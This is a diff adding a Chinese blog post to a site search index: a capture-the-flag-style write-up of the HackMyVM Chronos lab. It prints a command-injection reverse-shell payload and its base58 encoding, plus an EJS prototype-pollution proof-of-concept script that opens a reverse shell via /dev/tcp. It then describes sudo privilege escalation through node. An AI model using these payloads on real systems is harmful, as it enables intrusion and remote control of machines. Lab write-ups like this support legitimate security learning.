@@ -1527,4 +1527,51 @@
         <tag>复盘</tag>
       </tags>
   </entry>
+  <entry>
+    <title>hackmyvm Chronos复盘</title>
+    <url>/2024/06/21/hackmyvm-Chronos%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>一个考验细心的靶场，我还挺被卡的，也是给我一个教训，写复盘主要是记录回顾，做出来主要还是参考了大佬的wp，写完wp还是意识到自己基础太弱，希望暑假能静下心好好补基础</p>
+<p>主要参考：</p>
+<p><a class="link"   href="https://al1enum.github.io/docs/Chronos.pdf" >https://al1enum.github.io/docs/Chronos.pdf<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b" >https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b<i class="fas fa-external-link-alt"></i></a> （讲的很细，推荐）</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>前期看到开了22，80，8000端口，先看80和8000</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174335.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174353.png" ></p>
+<p>最开始拿到两个网页，内容差不多，查看源代码也没看到什么新东西，扫了很久目录扫到一个&#x2F;date，访问之后是一些报错，暂时对我没什么帮助，这个时候我就被卡住了。。。。</p>
+<p>然后我就看了wp提示，要观察访问网站的请求包</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174604.png" ></p>
+<p>可以看到这里有个域名，要编辑一下&#x2F;etc&#x2F;hosts了，再访问</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174835.png" ></p>
+<p>主要到&#x2F;data?format&#x3D;有一段内容，尝试拿去解码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174930.png" ></p>
+<p>base58解码后发现这是一个显示时间的命令，至于为什么会Permission Denied，经过研究，发现是请求包的缺少了特定的ua头（正常抓包能发现是有的）<strong>（后来发现网站源码有一段被混淆的代码，解混淆后也能知道要求有特定ua头才能执行代码）</strong></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175416.png" ></p>
+<p>于是加上之后才能正确看到时间</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175458.png"   style="zoom:50%;" >
+
+<h4 id="功能点利用"><a href="#功能点利用" class="headerlink" title="功能点利用"></a>功能点利用</h4><p>知道有这个功能点，可以尝试命令注入，format参数接收命令，于是尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.64.3/8888 0&gt;&amp;1&#x27;</span><br><span class="line">base58编码：YLAX9KhLnbeXJEfvdxJCU6qbixB1RzHhWDZ87VijVMTAtiYpjwpV2jJXtqZBGQg1uLKckNVQHium3Ca</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹到shell</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看了一下靶机开放的端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623102311.png" ></p>
+<p>发现内网还开了一个8080端口，curl一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105206.png" ></p>
+<p>发现有Chronos version2，回到上一级目录，有一个chronos-v2，看一下代码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105320.png" ></p>
+<p>ejs库使用<code>express-fileupload</code>来处理文件上传，有一个利用原型链污染的poc（还不是很懂原理）可以直接用</p>
+<p><a class="link"   href="https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py" >https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">### commands to run on victim machine</span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.64.3/1234 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Starting Attack...&quot;)</span><br><span class="line">### pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line">### execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br><span class="line">print(&quot;Finished!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>执行这个poc就能得到imera的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110405.png" ></p>
+<p>然后sudo -l就能看到有node和npm可以用</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110430.png" ></p>
+<p>直接gtfobins利用node一把梭，提权成功，结束</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110532.png" ></p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+      </tags>
+  </entry>
 </search>
